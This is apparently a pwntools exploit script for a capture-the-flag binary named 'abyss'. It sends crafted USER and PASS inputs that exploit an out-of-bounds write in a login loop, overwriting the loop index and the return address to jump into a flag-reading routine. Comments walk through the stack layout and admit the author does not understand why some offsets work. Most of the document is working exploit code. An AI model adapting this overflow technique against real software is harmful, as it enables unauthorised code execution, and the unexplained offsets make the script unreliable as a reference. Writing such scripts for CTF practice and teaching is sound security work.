#!/usr/bin/env python3

from pwn import *

e = ELF('./challenge/abyss')
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+0x30)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # There was a mystry bothered me for a while:
    #
    # "for the off-boundry-write issue in the while-loop in the cmd_login(), if we enter 512 bytes for user, it is supposed to continue the copying infinitely.
    # But why it stopped in the middle?
    #
    # It turns out when the index `i` is 0x411, the user[i-5] will overwrite the `i` itself (i.e. [rbp-0x4]) thus it skipps some parts. e.g.
    # I used `A` as the payload first. It is 0x41. So it change the i from 0x411 to 0x441. This skips all the bytes between them.
    # If you input `0x11` instead of `A`, it will continue overwrite the high bits of the `i` to make it like 0x1113 which is bigger and still skipps the bytes between.

    # One example of their addresses are:
    # - buff:    0x7ffdef12f100
    # - user:    0x7ffdef12f300
    # - pass:    0x7ffdef12f500
    # - index i: 0x7ffdef12f70c
    # So the index i is 0x20c after the pass. To overwrite the i, there must be (0x20c + 1)=0x20d written into pass. i.e. pass[i-5]=pass[0x20d].
    # So i-5 = 0x20d -> i=0x212 when it overflows to i. We want to only overwrite the i to 0x215 (the int i has 4 bytes) so that we can continue overwriting the values after the i.

    # Inspired by the above observation, the plan is:
    # 1. input '0x14' * 18 + (pwn cyclic) in user. (Using 0x14 because the code will also add 1 to the i to make it 0x215)
    # 2. Input 512 bytes for pass. This causes the while-loop reads OOB so the total is (buff + user) = 0x200 + 0x12 + pwn-cyclic = 0x212 + pwn-cyclic
    # 3. Locate the return address overflow by pwn cyclic.
    # 4. Jump to cmd_read to read flag.

    # TODO: ??? The following sounds right but somehow it doesn't work. And by the manual trial and error, the other value works. Need to investigate.
    # But we hit one issue: we also overwrite the RBP to an inaccessible address, which fails operations like [rbp+0x12] in the caller function.
    # Thus we need to use 0x1f which passes the rbp value on stack and we directly overwrite the return address only.
    # The 0x1f is from the (0x14 + 11), the 11 is from the previous pwn cyclic result.
    # TODO: ???

    # Add these pause()/sleep() so that gdb can attach to the first read(). And somehow if we send them all at once,
    # some input may be read together incorerectly. Possibly this is because we don't have newlines.
    r.send(b'\x00\x00\x00\x00')
    sleep(1)
    # 512 bytes in total
    ret_addr = 0x4014eb # The address in cmd_read which reads the flag file name.
    # user = b'USER ' + b'\x14' * 18 + b'\x90' * 11
    user = b'USER ' + b'\x1c' * 18 + b'\x90' * 11
    user += p64(ret_addr)
    info(f'user has lenght {len(user)}')
    r.send(user)
    sleep(1)
    passwd = b'PASS ' + b'B'*507
    info(f'pass has length {len(passwd)}')
    r.send(passwd)
    sleep(1)
    r.send(b'flag.txt')

    r.interactive()

if __name__ == "__main__":
    main()
